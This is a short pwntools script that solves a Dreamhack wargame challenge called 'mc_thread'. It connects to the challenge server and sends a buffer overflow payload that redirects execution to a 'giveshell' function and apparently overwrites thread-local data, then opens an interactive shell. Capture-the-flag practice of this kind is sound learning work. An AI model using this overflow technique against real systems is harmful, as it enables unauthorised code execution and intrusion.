from pwn import *

#r = process("./mc_thread")
r = remote("host3.dreamhack.games", 19667)
e = ELF("./mc_thread")
context.arch = "amd64"

payload = b"A"*0x118 + p64(e.symbols["giveshell"]) + b"A"*0x7F0 + p64(0x404800-0x972) + b"A"*0x18

r.recvuntil(b"Size: ")
r.sendline(str(0x930 // 8).encode())

r.recvuntil(b"Data: ")
r.sendline(payload)

r.interactive()